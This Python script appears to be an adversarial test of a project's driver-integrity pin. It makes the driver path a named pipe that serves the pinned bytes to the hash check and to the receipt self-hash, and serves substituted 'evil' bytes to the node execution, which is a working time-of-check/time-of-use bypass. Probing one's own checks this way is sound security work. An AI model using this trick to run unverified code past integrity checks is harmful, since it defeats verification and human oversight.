#!/usr/bin/env python3
"""R99Sentinel: does the driver-pin check bind the BYTES THAT EXECUTE?

The counter hashes lane/scripts/client-oopif-uploadsets-round99.mjs (read #1) and later
spawns node on that same path (read #2), and the driver hashes its own file again at
receipt-write time (read #3).  If reads 1 and 3 can be fed the pinned bytes while read 2
executes different bytes, the pin is satisfied while a laundering driver runs.

Mechanism: make the driver path a FIFO.  A writer feeds the three reads in order:
  read 1 (counter hash)  -> FROZEN bytes  (hash == pin)
  read 2 (node exec)    -> EVIL bytes    (laundering driver executes)
  read 3 (driver SELF)  -> FROZEN bytes  (receipt.driverSha256 == pin)
"""
import hashlib, os, shutil, subprocess, sys, threading, json, time

ROOT = "/fast/scratch/hyaku/tabi-r99/R99Sentinel"
FROZEN = "/home/vgpnk/Projects/shokunin/tabi-shokunin/scripts/client-oopif-uploadsets-round99.mjs"
COUNTER = "/home/vgpnk/Projects/shokunin/tabi-shokunin/scripts/check-client-oopif-uploadsets-round99.mjs"
EVIL = os.path.join(ROOT, "mutant-b.mjs")

LANEDIR = os.path.join(ROOT, "lane-fifo")
LANE = os.path.join(LANEDIR, "scripts")
SCRATCH = os.path.join(ROOT, "s-fifo")
PORT = (34674, 34675, 34676)

shutil.rmtree(LANEDIR, ignore_errors=True)
os.makedirs(LANE, exist_ok=True)
shutil.rmtree(SCRATCH, ignore_errors=True)

frozen_bytes = open(FROZEN, "rb").read()
evil_bytes = open(EVIL, "rb").read()
pin = hashlib.sha256(frozen_bytes).hexdigest()

shutil.copy2(COUNTER, os.path.join(LANE, "check-client-oopif-uploadsets-round99.mjs"))
TARGET = os.path.join(LANE, "client-oopif-uploadsets-round99.mjs")
os.mkfifo(TARGET)

reads = []


def writer():
    seq = [("frozen", frozen_bytes), ("evil", evil_bytes), ("frozen", frozen_bytes)]
    for kind, data in seq:
        try:
            with open(TARGET, "wb") as w:
                w.write(data)
                w.flush()
            reads.append(kind + ":" + hashlib.sha256(data).hexdigest()[:12])
        except Exception as e:
            reads.append("ERR:" + str(e))
        # Let the reader hit EOF and finish before the NEXT writer attaches; otherwise a
        # reader that is still open consumes the next writer's bytes too (and the
        # concatenated result is a third, unrecognised sha).
        time.sleep(3.0)
    while True:
        try:
            with open(TARGET, "rb") as r:
                data = r.read()
            reads.append("extra(%d)" % len(data))
        except Exception:
            return


threading.Thread(target=writer, daemon=True).start()

env = dict(os.environ, TABI_R99_NONCE="tabi-r99-fifo")
cmd = ["node", os.path.join(LANE, "check-client-oopif-uploadsets-round99.mjs"),
       "--lane", LANEDIR, "--expect-driver-sha256", pin, "--live",
       "--deps", os.path.join(ROOT, "deps"), "--scratch", SCRATCH,
       "--ports", ",".join(map(str, PORT)), "--reps", "1", "--json"]
try:
    p = subprocess.run(cmd, capture_output=True, text=True, timeout=300, env=env)
    out, rc, err = p.stdout, p.returncode, p.stderr
except subprocess.TimeoutExpired:
    out, rc, err = "", "TIMEOUT", ""

print("=== READS SERVED (in order) ===")
print(reads)
print("=== rc ===", rc)
try:
    d = json.loads(out)
    print("verdict:", d.get("verdict"), "| launchFailed:", d.get("launchFailed"))
    for f in d.get("findings", []):
        print("   finding:", f["id"], f["leg"], str(f["detail"])[:150])
except Exception:
    print("raw stdout:", out[:2000])
    print("stderr:", err[:800])
